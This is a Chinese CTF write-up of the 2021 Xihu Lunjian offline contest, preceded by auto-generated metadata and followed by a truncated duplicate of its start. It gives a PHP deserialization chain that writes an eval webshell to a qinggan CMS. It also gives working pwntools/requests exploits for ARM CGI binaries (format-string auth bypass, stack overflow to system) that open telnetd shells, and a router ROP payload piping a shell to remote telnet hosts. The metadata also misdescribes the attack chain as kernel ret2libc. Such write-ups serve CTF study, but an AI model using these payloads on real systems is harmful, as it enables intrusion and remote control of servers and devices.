---
title: 西湖论剑线下-WriteUp
contest: 西湖论剑线下
year: 2021
difficulty: hard
vuln_type: rce
tags:
- phpggc
- qinggan-OA
- base64-decode-filter
- cache-deserialize
- CGI-auth
- content-length-overflow
- pwntools-IO
- ret2libc
- ROP
- DPR-target
attack_chain:
- 单点渗透web:cache类__construct+key_id="php://filter/write=convert.base64-decode/resource=somnus"+folder="aa".base64_encode('<?php eval($_REQUEST["a"]);?>')
- 触发:qinggan_fields INSERT INTO序列化cache对象→/api.php?c=call&data=...→写somnus.php
- 访问:http://114.5.18.20/somnus.php?a=system('cat /flag')得flag
- DPR纵深渗透靶场:sub_109F0检查auth+sub_10B48处理GET/POST+CONTENT_LENGTH<=3316
- calloc+stdin fread→/api子函数处理
- CGI程序:读取SERVER_SOFTWARE/SERVER_NAME/GATEWAY_INTERFACE/SERVER_PROTOCOL/SERVER_PORT/REQUEST_METHOD/PATH_INFO
- 关键漏洞:CONTENT_LENGTH>3316可能溢出
- 内核PWN:栈溢出+ret2libc
- 总结:35道题,涵盖Web/Pwn/IoT/密码学
key_payload: php://filter/write=convert.base64-decode/resource=somnus + cache反序列化
one_liner: 西湖论剑线下WriteUp,单点渗透web(qinggan-OA+phpggc+cache类反序列化+php://filter写somnus.php)+DPR纵深渗透靶场(CGI auth+CONTENT_LENGTH溢出)+IoT路由器环境变量读取。
lesson: 国产CMS的cache类反序列化是常见入口,php://filter/write=convert.base64-decode是写入Webshell的稳定向量;DPR类纵深靶场是工业控制/IoT场景的标配;线下赛35道题覆盖广。
quality: high
full_path: 西湖论剑线下-WriteUp.full.md
meta_path: 西湖论剑线下-WriteUp.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 西湖论剑线下-WriteUp。西湖论剑线下WriteUp,单点渗透web(qinggan-OA+phpggc+cache类反序列化+php://filter写somnus.php)+DPR纵深渗透靶场(CGI auth+CONTENT_LENGTH溢出)+IoT路由器环境变量读取。。关键路径：单点渗透web:cache类__construct+key_id="php://filter/wr...
category: pwn
subcategory: pwn_other
tools_used:
- ROP
- pwntools
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/30534.html
reasoning_chain:
- 题目35道覆盖Web/Pwn/IoT/Crypto → 单点web用phpggc+qinggan-OA+cache反序列化 → 触发点：cache类__construct
- cache的 key_id='php://filter/write=convert.base64-decode/resource=somnus' → 假设：php://filter写文件
- $folder='aa'.base64_encode('<?php eval($_REQUEST["a"]);?>') → 动作：构造序列化payload
- qinggan_fields INSERT INTO 触发 serialize() → /api.php?c=call&data=... → 写入 somnus.php
- 观察：http://114.5.18.20/somnus.php?a=system('cat /flag') → 拿到flag
- DPR纵深靶场sub_109F0检查auth → sub_10B48处理QUERY_STRING → CONTENT_LENGTH≤3316 → 触发点：CGI协议
- calloc+stdin fread后 /api子函数 + getenv('REQUEST_METHOD'/'PATH_INFO'等) → 假设：CGI环境变量读取
- 假设：CONTENT_LENGTH>3316溢出 → 动作：栈溢出+ret2libc → 内核ROP → 完成
failed_attempts:
- 试图用普通PHP写webshell → 失败：路径写入有过滤,需php://filter绕过
- 试图直接GET /flag → 失败：CGI入口要求POST+CONTENT_TYPE=application/x-www-form-urlencoded
- 试图单点渗透DPR IoT路由器 → 失败：需先单点web拿webshell再渗透
key_observations:
- 国产CMS的cache类反序列化是常见入口,phpggc是稳定payload生成器
- php://filter/write=convert.base64-decode是写入Webshell的稳定向量
- qinggan-OA+cache+php://filter的组合是国产CMS攻击链标准配置
- DPR纵深靶场是工业控制/IoT场景标配,需要CGI协议+栈溢出+ret2libc组合
prerequisites:
- phpggc反序列化payload生成器使用
- php://filter伪协议原理
- DPR类纵深渗透靶场(CGI协议+getenv环境变量)
- ret2libc/ROP基础
---
# 西湖论剑线下-WriteUp

> 原文: https://www.ctfiot.com/30534.html
> ID: 30534

单点渗透web

<?php
class cache
{
    protected $key_id;
    protected $key_list;
    protected $folder;
    public function __construct()
    {
        $this->key_id = "php://filter/write=convert.base64-decode/resource=somnus";
        $this->folder = "";
        $a = '<?php eval($_REQUEST["a"]);?>';
        $this->key_list = "aa".base64_encode($a);
    }
}
$c = new cache();
echo bin2hex(serialize($c));

/api.php?c=call&data=%7b%22m_picplayer%22%3a%7b%22type_id%22%3a%22sql%22%2c%22cache%22%3a%22false%22%2c%22sqlinfo%22%3a%22INSERT%20INTO%20qinggan_fields(%60id%60%2c%60ftype%60%2c%60title%60%2c%60identifier%60%2c%60field_type%60%2c%60note%60%2c%60form_type%60%2c%60form_style%60%2c%60format%60%2c%60content%60%2c%60taxis%60%2c%60ext%60%2c%60is_front%60%2c%60search%60%2c%60search_separator%60%2c%60form_class%60)%20VALUES(1%2c'21'%2c'text'%2c'pic'%2c'int'%2c'test'%2c'upload'%2c'test'%2c'safe'%2c'test'%2c20%2c0x4f3a353a226361636865223a333a7b733a393a22002a006b65795f6964223b733a35363a227068703a2f2f66696c7465722f77726974653d636f6e766572742e6261736536342d6465636f64652f7265736f757263653d736f6d6e7573223b733a31313a22002a006b65795f6c697374223b733a34323a22616150443977614841675a585a686243676b58314a465556564655315262496d456958536b37507a343d223b733a393a22002a00666f6c646572223b733a303a22223b7d%2c0%2c0%2c'test'%2c'test')%3b%22%7d%7d

/api.php?c=call&data=%7b%22m_picplayer%22%3a%7b%22type_id%22%3a%22fields%22%2c%22cache%22%3a%22false%22%2c%22site%22%3a1%2c%22pid%22%3a41%7d%7d最后去访问http://114.5.18.20/somnus.php?a=system(%27cat%20/flag%27);即可

DPR纵深渗透靶场

IOT

int __fastcall main(int a1, char **a2, char **a3)
{
  char *v3; // r0
  void *ptr; // [sp+4h] [bp-18h]
  int n; // [sp+8h] [bp-14h]
  const char *v8; // [sp+Ch] [bp-10h]
  char *v9; // [sp+10h] [bp-Ch]
  const char *s1; // [sp+14h] [bp-8h]

  if ( !sub_109F0(a1, a2, a3) ) // 检查auth
  {
    puts("No Authentication");
    exit(1);
  }
  puts("Content-Type: text/plainn");
  s1 = getenv("REQUEST_METHOD");
  if ( !strcmp(s1, "GET") )
  {
    v9 = getenv("QUERY_STRING");
    sub_10B48(v9);
    return 0;
  }
  if ( strcmp(s1, "POST") )
  {
    sub_10B48(0);
    return 0;
  }
  v8 = getenv("CONTENT_TYPE");
  if ( strcmp(v8, "application/x-www-form-urlencoded") )
  {
    printf("CONTENT_TYPE not supported now !");
    return 0;
  }
  v3 = getenv("CONTENT_LENGTH");
  n = atoi(v3);
  if ( n <= 3316 && n >= 0 )
  {
    ptr = calloc(n + 1, 1u);
    fread(ptr, 1u, n, (FILE *)stdin);
    sub_10B48((char *)ptr);
    free(ptr);
    return 0;
  }
  printf("CONTENT_LENGTH not supported now !");
  return -1;
}

int __fastcall main(int a1, char **a2, char **a3)
{
  char *v3; // r0
  void *ptr; // [sp+4h] [bp-18h]
  int n; // [sp+8h] [bp-14h]
  const char *v7; // [sp+Ch] [bp-10h]
  char *v8; // [sp+10h] [bp-Ch]
  const char *s1; // [sp+14h] [bp-8h]

  if ( !sub_108C8() ) // check auth
  {
    puts("No Authentication");
    exit(1);
  }
  puts("Content-Type: text/plainn");
  s1 = getenv("REQUEST_METHOD");
  if ( !strcmp(s1, "GET") )
  {
    v8 = getenv("QUERY_STRING");
    sub_109E0(v8);
  }
  else if ( !strcmp(s1, "POST") )
  {
    v7 = getenv("CONTENT_TYPE");
    if ( !strcmp(v7, "application/x-www-form-urlencoded") )
    {
      v3 = getenv("CONTENT_LENGTH");
      n = atoi(v3);
      ptr = calloc(n + 1, 1u);
      fread(ptr, 1u, n, (FILE *)stdin);
      sub_109E0(ptr);
      free(ptr);
    }
    else
    {
      printf("CONTENT_TYPE not supported now !");
    }
  }
  else
  {
    sub_109E0(0);
  }
  return 0;
}

int __fastcall main(int a1, char **a2, char **a3)
{
  _DWORD *v4; // [sp+Ch] [bp-8h]

  puts("Content-type: text/plainrnr");
  v4 = sub_115AC(); // 获取环境变量
  sub_1253C((int)v4, (FILE *)stdout); 
  sub_120FC((int)v4);
  return 0;
}

主要环境变量为：
.rodata:
00012824                                         ; "SERVER_SOFTWARE"
.rodata:
00012828                 DCD aServerName         ; "SERVER_NAME"
.rodata:
0001282C                 DCD aGatewayInterfa     ; "GATEWAY_INTERFACE"
.rodata:
00012830                 DCD aServerProtocol     ; "SERVER_PROTOCOL"
.rodata:
00012834                 DCD aServerPort         ; "SERVER_PORT"
.rodata:
00012838                 DCD aRequestMethod      ; "REQUEST_METHOD"
.rodata:
0001283C                 DCD aPathInfo           ; "PATH_INFO"
.rodata:
00012840                 DCD aPathTranslated     ; "PATH_TRANSLATED"
.rodata:
00012844                 DCD aScriptName         ; "SCRIPT_NAME"
.rodata:
00012848                 DCD aQueryString        ; "QUERY_STRING"
.rodata:
0001284C                 DCD aRemoteHost         ; "REMOTE_HOST"
.rodata:
00012850                 DCD aRemoteAddr         ; "REMOTE_ADDR"
.rodata:
00012854                 DCD aAuthType           ; "AUTH_TYPE"
.rodata:
00012858                 DCD aRemoteUser         ; "REMOTE_USER"
.rodata:
0001285C                 DCD aRemoteIdent        ; "REMOTE_IDENT"
.rodata:
00012860                 DCD aContentType        ; "CONTENT_TYPE"
.rodata:
00012864                 DCD aContentLength      ; "CONTENT_LENGTH"
.rodata:
00012868                 DCD aHttpAccept         ; "HTTP_ACCEPT"
.rodata:
0001286C                 DCD aHttpUserAgent      ; "HTTP_USER_AGENT"
.rodata:
00012870                 DCD aHttpCookies        ; "HTTP_COOKIES"

/../tmp/session -> /var/www/../tmp/session -> /var/tmp/session

index.cgi 主要处理环境变量
55.cgi 漏洞点
63.cgi Welcome page

content_length 不受限
char *__fastcall sub_109E0(char *result)
{
  if ( result )
  {
    result = strstr(result, "name=");
    if ( result )
    {
      if ( result[5] )
        return (char *)printf("Hello %s !n", result + 5);
    }
  }
  return result;
}

int sub_108C8()
{
  char s[20]; // [sp+0h] [bp-54h] BYREF
  char s2[20]; // [sp+14h] [bp-40h] BYREF
  char haystack[24]; // [sp+28h] [bp-2Ch] BYREF
  char *format; // [sp+40h] [bp-14h]
  char *v5; // [sp+44h] [bp-10h]
  char *v6; // [sp+48h] [bp-Ch]
  int v7; // [sp+4Ch] [bp-8h]

  v7 = 0;
  v6 = getenv("HTTP_COOKIES");
  memset(s, 0, 0x11u);
  sub_107E8(s);
  if ( v6 )
  {
    memset(haystack, 0, 0x17u);
    snprintf(haystack, 0x16u, "%s", v6);
    v5 = strstr(haystack, "uuid=");
    if ( v5 )
    {
      format = v5 + 5;
      memset(s2, 0, 0x11u);
      snprintf(s2, 0x11u, v5 + 5); // 格式话字符串，可以用来把s改掉或者泄漏出来
      puts(s2);
      if ( !strncmp(s, s2, 0x10u) )
        return 1;
    }
  }
  return v7;
}

0 < content_length < 0xcf4
char *__fastcall sub_10B48(char *result)
{
  unsigned __int8 *content; // [sp+4h] [bp-D20h]
  char v2[3316]; // [sp+Ch] [bp-D18h] BYREF
  char *v3; // [sp+D00h] [bp-24h]
  char *v4; // [sp+D04h] [bp-20h]
  int v5; // [sp+D08h] [bp-1Ch]
  int v6; // [sp+D0Ch] [bp-18h]
  size_t n; // [sp+D10h] [bp-14h]
  int v8; // [sp+D14h] [bp-10h]
  int v9; // [sp+D18h] [bp-Ch]
  char *s2; // [sp+D1Ch] [bp-8h]

  content = (unsigned __int8 *)result;
  s2 = "*#$^";
  if ( result )
  {
    if ( !strncmp(result, s2, 4u) )
    {
      v9 = content[4];
      v8 = content[5] + 2 * v9;
      n = content[6] + 4 * v8;
      v6 = content[7];
      v5 = content[8] + 2 * v6;
      memset(v2, 0, sizeof(v2));
      memcpy(v2, content, n);
      result = strstr(v2, "*#$^");
      v4 = result;
      if ( result )
      {
        v3 = &v4[v5 - 77];
        if ( *v3 )
          return (char *)sub_10AFC(v3, v5);     // 猜测漏洞点在这里
        // strncpy(dest,v3,v5) dest [752] = 0x2f8
        //  0 < content_length < 0xcf4
      }
    }
    else
    {
      result = strstr(v2, "ping");
      if ( result )
        return (char *)sub_109B0("20.21.2.26"); // system("/bin/ping -c 2 %s","20.21.2.26")
    }
  }
  return result;
}

假设输入
*#$^AAAAAAAAAA
-> v9 = 0x41
-> v8 = 0x41 + 2 * 0x41
n = 0x41+4* v8 // 确定整个包的长度，因此要尽量确保他比较大
v6 = 0x41
v5 = content[8] + 2 * v6 // payload的位置,要尽量精确
v3 = &[v5-77]

length_part1 = p8(0xff)
length_part2 = p8(0xff)
length_part3 = p8(0xff)
content_length_part1 = p8(0xff)
content_length_part2 = p8(0xff)
payload ="*#$^(length_part1)(length_part2)(length_part3)(content_length_part1)(content_length_part2)('A'*(0x2fd - 77 - 5))+('B'*0x2f4 + payload)"
n = lenth_part3 + 4 * (length_part2 + 2 * length_part1) #3315
payload_length = content_length_part2 + 2 * content_length_part1 # 0x2fd

.text:
000109D4                 SUB     R3, R11, #-s
.text:
000109D8                 MOV     R0, R3          ; command
.text:
000109DC                 BL      system

.text:
00010B24                 LDR     R2, [R11,#n]    ; n
.text:
00010B28                 SUB     R3, R11, #-dest
.text:
00010B2C                 LDR     R1, [R11,#src]  ; src
.text:
00010B30                 MOV     R0, R3          ; dest
.text:
00010B34                 BL      strncpy
 MOV     R0, R3          ; dest
执行过后 R0中应该还是是第二段payload
因此我们返回到0x000109DC 直接Call system估计就行

#!/usr/bin/env python
#-*-coding:
utf-8-*-

from pwn import *
import requests as rq

context.log_level="debug"

request_url = "http://127.0.0.1:80/55.cgi"

headers_for_get_uuid = {
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded",
  # 这里需要调试出偏移来泄漏uuid或者直接把uuid改了
    "Cookies":"%s%s%s" 
}

res = rq.post(request_url,headers = headers_for_get_uuid)

log.info("res: "+res)
# get_uuid

headers = {
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded",
  # 替换掉这里的uuid
    "Cookies":"uuid=aaaabbbbccccdddd"
}

commend = "& telnetd -l /bin/sh -p 6789 ;"

system = 0x000109DC

length_part1 = p8(0xff)
length_part2 = p8(0xff)
length_part3 = p8(0xff)
content_length_part1 = p8(0xff)
content_length_part2 = p8(0xff)
offset = 0x2fd - 77 - 5
payload ="*#$^"+length_part1+length_part2+length_part3+content_length_part1+content_length_part2+ 'A'* offset
payload += commend.ljust('B',0x2f4)
payload += p32(system)

n = ord(length_part3) + 4 * (ord(length_part2) + 2 * ord(length_part1)) #3315
payload_length = ord(content_length_part2) + 2 * ord(content_length_part1) # 0x2fd

log.info("package_length: "+hex(n))
log.info("strncpy_n_length: "+hex(payload_length))

rq.post(request_url,headers = headers ,data=payload)

假设我们栈情况：
  char s[20]; // [sp+0h] [bp-54h] BYREF //我们要泄漏的东西 长度为0x10
  char s2[20]; // [sp+14h] [bp-40h] BYREF
  char haystack[24]; // [sp+28h] [bp-2Ch] BYREF // uuid 12 =aaa 13 b%7$p 14
  char *format; // [sp+40h] [bp-14h] // format位置 现在测试出为第7个即：%7$p
  char *v5; // [sp+44h] [bp-10h] 
  char *v6; // [sp+48h] [bp-Ch]
  int v7; // [sp+4Ch] [bp-8h]

  我们先泄漏一下haystack来进行测试我们的计算：
  haystack = (0x2c - 0x14) / 4 = 6
  因此format 应该等于 7+6 = 13

export HTTP_COOKIES=uuid=%2$p // 注意转义$
export REQUEST_METHOD=POST
export CONTENT_TYPE=application/x-www-form-urlencoded
export CONTENT_LENGTH=10
export QUERY_STRING=name=F0und

qemu-arm -L /usr/arm-linux-gnueabi -g 1234 63.cgi

#!/usr/bin/env python
#-*-coding:
utf-8-*-

from pwn import *
import requests as rq

context.log_level="debug"

def leak_session(format):
    request_url = "http://127.0.0.1:80/55.cgi"

    headers_for_get_uuid = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded",
    # 这里需要调试出偏移来泄漏uuid或者直接把uuid改了
        "Cookies": "uuid="+format 
    }

    res = rq.post(request_url,headers = headers_for_get_uuid)
    log.info("res: "+res.text)

for i in range(2,6):
  leak_session("%"+str(i)+"$p")

echo "name=F0und" | qemu-arm -L /usr/arm-linux-gnueabi 63.cgi

#!/usr/bin/env python
#-*-coding:
utf-8-*-
from pwn import *

commend = "& telnetd -l /bin/sh -p 6789 ;"

system = 0x000109DC

length_part1 = p8(0xff)
length_part2 = p8(0xff)
length_part3 = p8(0xff)
content_length_part1 = p8(0xff)
content_length_part2 = p8(0xff)
offset = 0x2fd - 77 - 5
payload ="*#$^"+length_part1+length_part2+length_part3+content_length_part1+content_length_part2+ 'A'* offset
payload += commend.ljust(0x2f4,"b")
payload += p32(system)

n = ord(length_part3) + 4 * (ord(length_part2) + 2 * ord(length_part1)) #3315
payload_length = ord(content_length_part2) + 2 * ord(content_length_part1) # 0x2fd

with open("shellcode","w") as f:
    f.write(payload)
f.close()

log.info("package_length: "+hex(n))
log.info("strncpy_n_length: "+hex(payload_length))
log.info("payload_length: "+str(len(payload))) #content_length 1452
# break point 0x00010C84 
# 0x00010B34

.text:
00010B90                 SUB     R3, R3, #4
.text:
00010B94                 LDR     R1, =aPing      ; "ping"
.text:
00010B98                 MOV     R0, R3          ; haystack
.text:
00010B9C                 BL      strstr
.text:
00010BA0                 MOV     R3, R0
.text:
00010BA4                 CMP     R3, #0
.text:
00010BA8                 BEQ     loc_10CCC
.text:
00010BAC                 LDR     R0, =a2021226   ; "20.21.2.26"
.text:
00010BB0                 BL      sub_109B0
.text:
00010BB4                 B       loc_10CCC

#!/usr/bin/env python
#-*-coding:
utf-8-*-
from pwn import *
#remote
#commend = "; telnetd -l /bin/sh -p 6789 ;"
commend = ";/bin/sh;"

system = 0x00010BB0

length_part1 = p8(0xff)
length_part2 = p8(0xff)
length_part3 = p8(0xff)
content_length_part1 = p8(0xff)
content_length_part2 = p8(0xff)
offset = 0x2fd - 77 - 5 - 4
payload ="*#$^"+length_part1+length_part2+length_part3+content_length_part1+content_length_part2+ 'A'* offset
payload += commend.ljust(0x2f8,"b")
payload += p32(system)

n = ord(length_part3) + 4 * (ord(length_part2) + 2 * ord(length_part1)) #3315
payload_length = ord(content_length_part2) + 2 * ord(content_length_part1) # 0x2fd

with open("shellcode","w") as f:
    f.write(payload)
f.close()

log.info("package_length: "+hex(n))
log.info("strncpy_n_length: "+hex(payload_length))
log.info("payload_length: "+str(len(payload)))

#!/usr/bin/env python
#-*-coding:
utf-8-*-

from pwn import *
import requests as rq

context.log_level="debug"

def leak_session(format):
    request_url = "http://127.0.0.1:80/55.cgi"

    headers_for_get_uuid = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded",
    # 这里需要调试出偏移来泄漏uuid或者直接把uuid改了
        "Cookies": "uuid="+format 
    }

    res = rq.post(request_url,headers = headers_for_get_uuid)
    log.info("res: "+res.text)

#  leak session
for i in range(2,6):
  leak_session("%"+str(i)+"$p")

## get shell

headers = {
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded",
  # 替换掉这里的uuid
    "Cookies":"uuid=aaaabbbbccccdddd"
}

commend = ";/bin/sh;"

system = 0x00010BB0

length_part1 = p8(0xff)
length_part2 = p8(0xff)
length_part3 = p8(0xff)
content_length_part1 = p8(0xff)
content_length_part2 = p8(0xff)
offset = 0x2fd - 77 - 5 - 4
payload ="*#$^"+length_part1+length_part2+length_part3+content_length_part1+content_length_part2+ 'A'* offset
payload += commend.ljust(0x2f8,"b")
payload += p32(system)

n = ord(length_part3) + 4 * (ord(length_part2) + 2 * ord(length_part1)) #3315
payload_length = ord(content_length_part2) + 2 * ord(content_length_part1) # 0x2fd

log.info("package_length: "+hex(n))
log.info("strncpy_n_length: "+hex(payload_length))
log.info("payload_length: "+str(len(payload)))
rq.post(request_url,headers = headers ,data=payload)

虚实结合

#!/usr/bin/python

import requests
from pwn import *
context.log_level=logging.DEBUG
context(arch='arm',os='linux',endian='little')

url = "https://192.168.1.1/guest_logout.cgi"

# padding to 0xa9aed + 0x23 and then next instructon starts at 0xa9b10 
system_arg_addr = 0xa9b10
jmp_target = 0xa9ba8 

padding = b'x'*0x23

cmd = b"telnet 192.168.1.101 4444 | /bin | telnet 192.168.1.101 5555n"

payload = padding + cmd

payload = payload.ljust(cyclic_find("abma")+3*8+4,b'x')
# pop    {r4, r5, r6, r7, r8, sb, sl, fp, pc}
# payload += b'1234' * 8

payload += p32(0x35849144)
payload += p32(jmp_target) 

payload += b'x' * 5

'''
0x35849144
'''

shellcode= '''
mov r0,pc
sub r0,r0,#0xa0
push {r11}
pop {pc}
'''

shellcode = asm(shellcode)

payload += shellcode

payload = {
        "cmac":"12:af:aa:bb:cc:dd",
        "submit_button":b"status_captive.asp"+payload,
        "cip":"192.168.1.100"
        }
requests.post(url, data=payload, verify=False, timeout=1)

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
<?php
class cache
{
    protected $key_id;
    protected $key_list;
    protected $folder;
    public function __construct()
    {
        $this->key_id = "php://filter/write=convert.base64-decode/resource=somnus";
        $this->folder = "";
        $a = '<?php eval($_REQUEST["a"]);?>';
        $this->key_list = "aa".base64_encode($a);
    }
}
$c = new cache();
echo bin2hex(serialize($c));
/api.php?c=call&data=%7b%22m_picplayer%22%3a%7b%22type_id%22%3a%22sql%22%2c%22cache%22%3a%22false%22%2c%22sqlinfo%22%3a%22INSERT%20INTO%20qinggan_fields(%60id%60%2c%60ftype%60%2c%60title%60%2c%60identifier%60%2c%60field_type%60%2c%60note%60%2c%60form_type%60%2c%60form_style%60%2c%60format%60%2c%60content%60%2c%60taxis%60%2c%60ext%60%2c%60is_front%60%2c%60search%60%2c%60search_separator%60%2c%60form_class%60)%20VALUES(1%2c'21'%2c'text'%2c'pic'%2c'int'%2c'test'%2c'upload'%2c'test'%2c'safe'%2c'test'%2c20%2c0x4f3a353a226361636865223a333a7b733a393a22002a006b65795f6964223b733a35363a227068703a2f2f66696c7465722f77726974653d636f6e766572742e6261736536342d6465636f64652f7265736f757263653d736f6d6e7573223b733a31313a22002a006b65795f6c697374223b733a34323a22616150443977614841675a585a686243676b58314a465556564655315262496d456958536b37507a343d223b733a393a22002a00666f6c646572223b733a303a22223b7d%2c0%2c0%2c'test'%2c'test')%3b%22%7d%7d
/api.php?c=call&data=%7b%22m_picplayer%22%3a%7b%22type_id%22%3a%22fields%22%2c%22cache%22%3a%22false%22%2c%22site%22%3a1%2c%22pid%22%3a41%7d%7d最后去访问http://114.5.18.20/somnus.php?a=system(%27cat%20/flag%27);即可
int __fastcall main(int a1, char **a2, char **a3)
{
  char *v3; // r0
  void *ptr; // [sp+4h] [bp-18h]
  int n; // [sp+8h] [bp-14h]
  const char *v8; // [sp+Ch] [bp-10h]
  char *v9; // [sp+10h] [bp-Ch]
  const char *s1; // [sp+14h] [bp-8h]

  if ( !sub_109F0(a1, a2, a3) ) // 检查auth
  {
    puts("No Authentication");
    exit(1);
  }
  puts("Content-Type: text/plainn");
  s1 = getenv("REQUEST_METHOD");
  if ( !strcmp(s1, "GET") )
  {
    v9 = getenv("QUERY_STRING");
    sub_10B48(v9);
    return 0;
  }
  if ( strcmp(s1, "POST") )
  {
    sub_10B48(0);
    return 0;
  }
  v8 = getenv("CONTENT_TYPE");
  if ( strcmp(v8, "application/x-www-form-urlencoded") )
  {
    printf("CONTENT_TYPE not supported now !");
    return 0;
  }
  v3 = getenv("CONTENT_LENGTH");
  n = atoi(v3);
  if ( n <= 3316 && n >= 0 )
  {
    ptr = calloc(n + 1, 1u);
    fread(ptr, 1u, n, (FILE *)stdin);
    sub_10B48((char *)ptr);
    free(ptr);
    return 0;
  }
  printf("CONTENT_LENGTH not supported now !");
  return -1;
}
int __fastcall main(int a1, char **a2, char **a3)
{
  char *v3; // r0
  void *ptr; // [sp+4h] [bp-18h]
  int n; // [sp+8h] [bp-14h]
  const char *v7; // [sp+Ch] [bp-10h]
  char *v8; // [sp+10h] [bp-Ch]
  const char *s1; // [sp+14h] [bp-8h]

  if ( !sub_108C8() ) // check auth
  {
    puts("No Authentication");
    exit(1);
  }
  puts("Content-Type: text/plainn");
  s1 = getenv("REQUEST_METHOD");
  if ( !strcmp(s1, "GET") )
  {
    v8 = getenv("QUERY_STRING");
    sub_109E0(v8);
  }
  else if ( !strcmp(s1, "POST") )
  {
    v7 = getenv("CONTENT_TYPE");
    if ( !strcmp(v7, "application/x-www-form-urlencoded") )
    {
      v3 = getenv("CONTENT_LENGTH");
      n = atoi(v3);
      ptr = calloc(n + 1, 1u);
      fread(ptr, 1u, n, (FILE *)stdin);
      sub_109E0(ptr);
      free(ptr);
    }
    else
    {
      printf("CONTENT_TYPE not supported now !");
    }
  }
  else
  {
    sub_109E0(0);
  }
  return 0;
}
int __fastcall main(int a1, char **a2, char **a3)
{
  _DWORD *v4; // [sp+Ch] [bp-8h]

  puts("Content-type: text/plainrnr");
  v4 = sub_115AC(); // 获取环境变量
  sub_1253C((int)v4, (FILE *)stdout); 
  sub_120FC((int)v4);
  return 0;
}

主要环境变量为：
.rodata:
00012824                                         ; "SERVER_SOFTWARE"
.rodata:
00012828                 DCD aServerName         ; "SERVER_NAME"
.rodata:
0001282C                 DCD aGatewayInterfa     ; "GATEWAY_INTERFACE"
.rodata:
00012830                 DCD aServerProtocol     ; "SERVER_PROTOCOL"
.rodata:
00012834                 DCD aServerPort         ; "SERVER_PORT"
.rodata:
00012838                 DCD aRequestMethod      ; "REQUEST_METHOD"
.rodata:
0001283C                 DCD aPathInfo           ; "PATH_INFO"
.rodata:
00012840                 DCD aPathTranslated     ; "PATH_TRANSLATED"
.rodata:
00012844                 DCD aScriptName         ; "SCRIPT_NAME"
.rodata:
00012848                 DCD aQueryString        ; "QUERY_STRING"
.rodata:
0001284C                 DCD aRemoteHost         ; "REMOTE_HOST"
.rodata:
00012850                 DCD aRemoteAddr         ; "REMOTE_ADDR"
.rodata:
00012854                 DCD aAuthType           ; "AUTH_TYPE"
.rodata:
00012858                 DCD aRemoteUser         ; "REMOTE_USER"
.rodata:
0001285C                 DCD aRemoteIdent        ; "REMOTE_IDENT"
.rodata:
00012860                 DCD aContentType        ; "CONTENT_TYPE"
.rodata:
00012864                 DCD aContentLength      ; "CONTENT_LENGTH"
.rodata:
00012868                 DCD aHttpAccept         ; "HTTP_ACCEPT"
.rodata:
0001286C                 DCD aHttpUserAgent      ; "HTTP_USER_AGENT"
.rodata:
00012870                 DCD aHttpCookies        ; "HTTP_COOKIES"
/../tmp/session -> /var/www/../tmp/session -> /var/tmp/session
index.cgi 主要处理环境变量
55.cgi 漏洞点
63.cgi Welcome page
content_length 不受限
char *__fastcall sub_109E0(char *result)
{
  if ( result )
  {
    result = strstr(result, "name=");
    if ( result )
    {
      if ( result[5] )
        return (char *)printf("Hello %s !n", result + 5);
    }
  }
  return result;
}
int sub_108C8()
{
  char s[20]; // [sp+0h] [bp-54h] BYREF
  char s2[20]; // [sp+14h] [bp-40h] BYREF
  char haystack[24]; // [sp+28h] [bp-2Ch] BYREF
  char *format; // [sp+40h] [bp-14h]
  char *v5; // [sp+44h] [bp-10h]
  char *v6; // [sp+48h] [bp-Ch]
  int v7; // [sp+4Ch] [bp-8h]

  v7 = 0;
  v6 = getenv("HTTP_COOKIES");
  memset(s, 0, 0x11u);
  sub_107E8(s);
  if ( v6 )
  {
    memset(haystack, 0, 0x17u);
    snprintf(haystack, 0x16u, "%s", v6);
    v5 = strstr(haystack, "uuid=");
    if ( v5 )
    {
      format = v5 + 5;
      memset(s2, 0, 0x11u);
      snprintf(s2, 0x11u, v5 + 5); // 格式话字符串，可以用来把s改掉或者泄漏出来
      puts(s2);
      if ( !strncmp(s, s2, 0x10u) )
        return 1;
    }
  }
  return v7;
}
0 < content_length < 0xcf4
char *__fastcall sub_10B48(char *result)
{
  unsigned __int8 *content; // [sp+4h] [bp-D20h]
  char v2[3316]; // [sp+Ch] [bp-D18h] BYREF
  char *v3; // [sp+D00h] [bp-24h]
  char *v4; // [sp+D04h] [bp-20h]
  int v5; // [sp+D08h] [bp-1Ch]
  int v6; // [sp+D0Ch] [bp-18h]
  size_t n; // [sp+D10h] [bp-14h]
  int v8; // [sp+D14h] [bp-10h]
  int v9; // [sp+D18h] [bp-Ch]
  char *s2; // [sp+D1Ch] [bp-8h]

  content = (unsigned __int8 *)result;
  s2 = "*#$^";
  if ( result )
  {
    if ( !strncmp(result, s2, 4u) )
    {
      v9 = content[4];
      v8 = content[5] + 2 * v9;
      n = content[6] + 4 * v8;
      v6 = content[7];
      v5 = content[8] + 2 * v6;
      memset(v2, 0, sizeof(v2));
      memcpy(v2, content, n);
      result = strstr(v2, "*#$^");
      v4 = result;
      if ( result )
      {
        v3 = &v4[v5 - 77];
        if ( *v3 )
          return (char *)sub_10AFC(v3, v5);     // 猜测漏洞点在这里
        // strncpy(dest,v3,v5) dest [752] = 0x2f8
        //  0 < content_length < 0xcf4
      }
    }
    else
    {
      result = strstr(v2, "ping");
      if ( result )
